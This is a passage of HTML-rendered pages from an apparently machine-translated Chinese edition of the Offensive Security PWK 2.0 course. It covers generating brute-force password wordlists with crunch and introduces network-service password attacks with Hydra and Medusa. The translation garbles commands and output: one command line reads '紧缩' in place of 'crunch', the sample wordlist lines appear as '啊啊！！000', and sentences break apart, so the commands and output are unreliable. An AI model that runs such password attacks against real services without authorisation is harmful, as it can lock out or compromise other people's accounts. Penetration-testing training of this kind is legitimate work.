<div style="position:absolute;top:159795;left:277"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">%</font></font></nobr></div>
<div style="position:absolute;top:159795;left:388"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数字字符</font></font></nobr></div>
<div style="position:absolute;top:159815;left:277"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^</font></font></nobr></div>
<div style="position:absolute;top:159815;left:388"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括空格在内的特殊字符</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:159835;left:341"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 596 - 字符转换格式</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:159864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了生成符合我们要求的词表，我们将指定一个最小值和最大值</font></font></nobr></div>
<div style="position:absolute;top:159884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">八个字符的字长（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8 8</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t ,@@^^%%%</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述我们的规则模式</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:159919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">紧缩 8 8 -t ,@@^^%%%</font></font></font></b></nobr></div>
<div style="position:absolute;top:159936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Crunch 现在将生成以下数据量：172262376000 字节</font></font></nobr></div>
<div style="position:absolute;top:159953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">164282 MB</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:159970;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">160GB</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:159987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 TB</font></font></nobr></div>
<div style="position:absolute;top:160004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 PB</font></font></nobr></div>
<div style="position:absolute;top:160021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Crunch 现在将生成以下行数：19140264000</font></font></nobr></div>
<div style="position:absolute;top:160038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">啊啊！！000</font></font></nobr></div>
<div style="position:absolute;top:160055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">啊啊！！001</font></font></nobr></div>
<div style="position:absolute;top:160072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">啊啊！！002</font></font></nobr></div>
<div style="position:absolute;top:160088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">啊啊！！003</font></font></nobr></div>
<div style="position:absolute;top:160106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">啊啊！！004</font></font></nobr></div>
<div style="position:absolute;top:160123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:160142;left:312"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 597 - 使用紧缩生成密码列表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:160171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该命令按预期工作，但如前所述，输出将消耗大量 160 GB</font></font></nobr></div>
<div style="position:absolute;top:160191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘空间！</font><font style="vertical-align: inherit;">请记住，暴力破解技术以牺牲密码为代价优先考虑密码覆盖范围</font></font></nobr></div>
<div style="position:absolute;top:160210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">速度，在这种情况下是磁盘空间。</font></font></nobr></div>
<div style="position:absolute;top:160243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们也可以用 crunch 定义一个字符集。</font><font style="vertical-align: inherit;">例如，我们可以创建一个蛮力词表</font></font></nobr></div>
<div style="position:absolute;top:160262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑长度在四到六个字符之间的密码（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4 6</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），只包含</font></font></nobr></div>
<div style="position:absolute;top:160282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符 0-9 和 AF ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0123456789ABCDEF</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，我们将输出写入文件 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:160302;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">紧缩.txt </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:160336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">crunch 4 6 0123456789ABCDEF -o crunch.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:160353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Crunch 现在将生成以下数据量：124059648 字节</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:160370;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">118 MB</font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:160427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">557 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(bofh28, 2016), https://sourceforge.net/projects/crunch-wordlist/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:160555;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="136"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 136 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:160588;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:161665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:161665;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:161665;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">577</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:160684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 GB</font></font></nobr></div>
<div style="position:absolute;top:160700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 TB</font></font></nobr></div>
<div style="position:absolute;top:160717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 PB</font></font></nobr></div>
<div style="position:absolute;top:160734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Crunch 现在将生成以下行数：17891328 </font></font></nobr></div>
<div style="position:absolute;top:160768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">紧缩：100% 完成生成输出</font></font></nobr></div>
<div style="position:absolute;top:160802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">head crunch.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:160819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0000</font></font></nobr></div>
<div style="position:absolute;top:160836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0001</font></font></nobr></div>
<div style="position:absolute;top:160853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0002</font></font></nobr></div>
<div style="position:absolute;top:160870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0003</font></font></nobr></div>
<div style="position:absolute;top:160887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0004</font></font></nobr></div>
<div style="position:absolute;top:160904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0005</font></font></nobr></div>
<div style="position:absolute;top:160921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0006</font></font></nobr></div>
<div style="position:absolute;top:160938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0007</font></font></nobr></div>
<div style="position:absolute;top:160955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0008</font></font></nobr></div>
<div style="position:absolute;top:160974;left:240"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 598 - 使用 crunch 生成具有特定字符集的密码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:161004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，文件输出大小明显小于前面的示例，主要是由于</font></font></nobr></div>
<div style="position:absolute;top:161023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">较短的密码长度以及有限的字符集。</font><font style="vertical-align: inherit;">但是，单词表文件是</font></font></nobr></div>
<div style="position:absolute;top:161043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">令人印象深刻，包含超过 1700 万个密码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:161077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wc -l crunch.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:161094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17891328 紧缩.txt</font></font></nobr></div>
<div style="position:absolute;top:161114;left:290"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 599 - 计算生成的密码的数量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:161143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，我们可以根据预定义的字符集生成密码，例如</font></font></nobr></div>
<div style="position:absolute;top:161163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/crunch/charset.lst。</font><font style="vertical-align: inherit;">例如，我们可以指定字符集文件的路径（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-f</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:161182;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/crunch/charset.lst </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) 并选择混合 alpha 集</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mixalpha </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，其中包括</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:161201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有小写​​和大写字母：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:161236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:161253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Crunch 现在将生成以下数据量：</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">140712049920 字节</font></font></font></b></nobr></div>
<div style="position:absolute;top:161270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">134193 MB</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:161287;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">131 GB</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:161304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 TB</font></font></nobr></div>
<div style="position:absolute;top:161321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 PB</font></font></nobr></div>
<div style="position:absolute;top:161338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Crunch 现在将生成以下行数：20158125312 </font></font></nobr></div>
<div style="position:absolute;top:161357;left:260"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 600 - 生成大小写字母的密码列表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:161387;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这个特殊的命令会生成一个巨大的 131 GB 单词表文件，但它提供了相当</font></font></nobr></div>
<div style="position:absolute;top:161406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">令人印象深刻的密码覆盖率。</font></font></nobr></div>
<div style="position:absolute;top:161439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">花时间在 JTR 和 crunch 上，想想如何最有效地使用每一个。</font><font style="vertical-align: inherit;">正如我们</font></font></nobr></div>
<div style="position:absolute;top:161458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将在下一节中发现，我们需要避免依赖大规模和泛型的诱惑</font></font></nobr></div>
<div style="position:absolute;top:161478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">词表，因为它们会对我们客户的生产环境产生不利影响。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:161512;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.2.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:161547;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（此练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:161579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 在你的 Kali 系统上添加一个用户，并为该账户指定一个复杂的密码</font></font></nobr></div>
<div style="position:absolute;top:161599;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括大小写字母、数字和特殊字符。</font><font style="vertical-align: inherit;">使用两个紧缩</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:161743;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="137"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 137 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:161776;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:162853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:162853;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:162853;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">578</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:161872;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">规则模式和预定义的字符集，以生成包含该词的词表</font></font></nobr></div>
<div style="position:absolute;top:161891;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户的密码。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:161928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3 常见的网络服务攻击方法</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:161970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们了解了如何为各种情况创建有效的词表，我们可以讨论</font></font></nobr></div>
<div style="position:absolute;top:161990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它们如何用于针对常见网络服务的密码攻击。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:162051;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，针对网络服务的密码攻击是嘈杂的，并且在</font></font></i></nobr></div>
<div style="position:absolute;top:162071;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在某些情况下，危险。</font><font style="vertical-align: inherit;">多次失败的登录尝试通常会生成日志</font></font></i></nobr></div>
<div style="position:absolute;top:162090;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和目标系统上的警告，甚至可能在预</font></font></i></nobr></div>
<div style="position:absolute;top:162109;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义的登录尝试失败次数。</font><font style="vertical-align: inherit;">这可能是灾难性的</font></font></i></nobr></div>
<div style="position:absolute;top:162129;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试，防止用户访问生产系统，直到</font></font></i></nobr></div>
<div style="position:absolute;top:162148;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员重新启用该帐户。</font><font style="vertical-align: inherit;">在盲目运行之前请记住这一点</font></font></i></nobr></div>
<div style="position:absolute;top:162168;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于网络的暴力攻击。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:162230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们权衡了风险并考虑了目标网络的福祉，我们就可以采取</font></font></nobr></div>
<div style="position:absolute;top:162249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提高密码测试效率的几个步骤。</font></font></nobr></div>
<div style="position:absolute;top:162282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据协议和密码破解工具，我们可以增加登录次数</font></font></nobr></div>
<div style="position:absolute;top:162301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">线程以提高攻击速度。</font><font style="vertical-align: inherit;">但是，在某些情况下（例如 RDP 和 SMB），</font></font></nobr></div>
<div style="position:absolute;top:162320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于协议限制，可能无法增加线程数，而我们的</font></font></nobr></div>
<div style="position:absolute;top:162340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优化尝试反而会减慢进程。</font></font></nobr></div>
<div style="position:absolute;top:162373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除此之外，值得注意的是协议的认证协商过程，例如</font></font></nobr></div>
<div style="position:absolute;top:162392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RDP 比 HTTP 更耗时。</font><font style="vertical-align: inherit;">然而，虽然攻击 RDP 协议可能</font></font></nobr></div>
<div style="position:absolute;top:162411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比攻击 HTTP 花费更多的时间，对 RDP 的成功攻击通常会产生更大的回报。</font></font></nobr></div>
<div style="position:absolute;top:162431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络服务密码攻击背后的隐藏艺术是选择合适的目标、用户列表、</font></font></nobr></div>
<div style="position:absolute;top:162450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和密码文件，然后再发起攻击。</font></font></nobr></div>
<div style="position:absolute;top:162483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功攻击网络服务（如 HTTP、SSH、VNC、FTP、SNMP、</font></font></nobr></div>
<div style="position:absolute;top:162502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和POP3），我们不仅要匹配目标用户名和密码，还要遵守协议</font></font></nobr></div>
<div style="position:absolute;top:162522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参与认证过程。</font></font></nobr></div>
<div style="position:absolute;top:162554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">幸运的是，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">THC-Hydra</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">558 </font></font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Medusa</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">559 </font></font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Crowbar</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">560</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">spray </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">561</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等流行工具</font><font style="vertical-align: inherit;">可以处理</font></font></nobr></div>
<div style="position:absolute;top:162574;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些对我们的身份验证请求。</font></font></nobr></div>
<div style="position:absolute;top:162607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将检查这些工具中的每一个，并权衡它们的有效协议和服务——</font></font></nobr></div>
<div style="position:absolute;top:162626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理能力。</font><font style="vertical-align: inherit;">下面几段提到的工具大多有类似的</font></font></nobr></div>
<div style="position:absolute;top:162645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能力和速度。</font><font style="vertical-align: inherit;">要使用的“正确”工具通常取决于首选的语法和输出</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:162743;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">558 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（THC Hydra，2019 年），https://github.com/vanhauser-thc/thc-hydra</font></font></font></nobr></div>
<div style="position:absolute;top:162763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">559 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Foofus.Net，2015），http://h.foofus.net/?page_id=51</font></font></font></nobr></div>
<div style="position:absolute;top:162783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">560 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Galkan, 2017)，https://github.com/galkan/crowbar</font></font></font></nobr></div>
<div style="position:absolute;top:162803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">561 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（蜘蛛实验室，2019 年），https://github.com/SpiderLabs/Spray</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:162931;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="138"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 138 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:162964;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:164041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:164041;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:164041;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">579</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:163060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式。</font><font style="vertical-align: inherit;">这只能通过在测试环境中对每个工具进行试验来确定，并且</font></font></nobr></div>
<div style="position:absolute;top:163079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">学习每个人的优点、缺点和特质。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:163114;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.3.1</font></font></i></nobr></div>
<div style="position:absolute;top:163114;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Medusa 进行 HTTP htaccess 攻击</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:163152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">据其作者称，美杜莎旨在成为“快速、大规模并行、模块化、登录</font></font></nobr></div>
<div style="position:absolute;top:163171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蛮力者”。</font></font></nobr></div>
<div style="position:absolute;top:163204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用 Medusa 尝试访问受 htaccess 保护的 Web 目录。</font></font></nobr></div>
<div style="position:absolute;top:163237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将设置我们的目标，一个安装在我们的 Windows 客户端上的 Apache 网络服务器，我们将</font></font></nobr></div>
<div style="position:absolute;top:163256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 XAMPP 控制面板启动。</font><font style="vertical-align: inherit;">我们将尝试访问受 htaccess 保护的</font></font></nobr></div>
<div style="position:absolute;top:163275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该服务器上的文件夹 /admin。</font><font style="vertical-align: inherit;">我们为这个例子选择的词表将是</font></font></nobr></div>
